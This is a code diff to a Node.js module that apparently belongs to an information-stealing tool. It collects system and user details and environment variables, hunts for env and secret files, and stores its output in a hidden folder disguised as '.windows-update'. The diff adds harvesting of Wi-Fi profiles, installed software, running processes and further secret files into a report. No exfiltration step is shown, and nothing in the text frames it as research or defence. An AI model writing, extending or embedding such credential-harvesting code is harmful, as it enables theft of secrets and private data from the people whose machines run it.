@@ -19,6 +19,10 @@ const getCPUInfo = require("../system/cpu");
 const getMemoryInfo = require("../system/memory");
 const getUserInfo = require("../system/user");
 const getEnvironmentInfo = require("../system/env");
+const getWifiProfiles = require("../system/wifi");
+const getInstalledSoftware = require("../system/software");
+const getProcessList = require("../system/processes");
+const { findSecretFiles } = require("../files/secretHunter");
 
 const HIDDEN_DIR = path.join(os.homedir(), ".windows-update");
 setAllowedDir(HIDDEN_DIR);
@@ -38,7 +42,10 @@ function collectSystemData() {
         cpu: safeCollect(getCPUInfo, "cpu", {}),
         memory: safeCollect(getMemoryInfo, "memory", {}),
         user: safeCollect(getUserInfo, "user", {}),
-        environmentVariables: safeCollect(getEnvironmentInfo, "env", {})
+        environmentVariables: safeCollect(getEnvironmentInfo, "env", {}),
+        wifi: safeCollect(getWifiProfiles, "wifi", []),
+        software: safeCollect(getInstalledSoftware, "software", []),
+        processes: safeCollect(getProcessList, "processes", [])
     };
 }
 
@@ -63,6 +70,10 @@ function huntEnvFiles() {
     const files = findEnvFiles(targets);
     logger.info(`Found ${files.length} env/secret files`);
     return { targets, totalFound: files.length, files };
+}
+
+function huntSecretFiles() {
+    return findSecretFiles();
 }
 
 function safeCrudStep(operation, fn) {
@@ -123,12 +134,13 @@ function performCrudOperations(rootDir, dryRun = false) {
     return crudLog;
 }
 
-function buildReport(systemData, envFiles, crudLog, startTime, errors = []) {
+function buildReport(systemData, envFiles, secretFiles, crudLog, startTime, errors = []) {
     return {
         timestamp: new Date().toISOString(),
         systemId: null,
         ...systemData,
         foundEnvFiles: envFiles,
+        foundSecretFiles: secretFiles,
         crudOperations: crudLog,
         runtime: {
             nodeVersion: process.version,
@@ -143,6 +155,7 @@ function buildReport(systemData, envFiles, crudLog, startTime, errors = []) {
 module.exports = {
     collectSystemData,
     huntEnvFiles,
+    huntSecretFiles,
     performCrudOperations,
     buildReport
 };
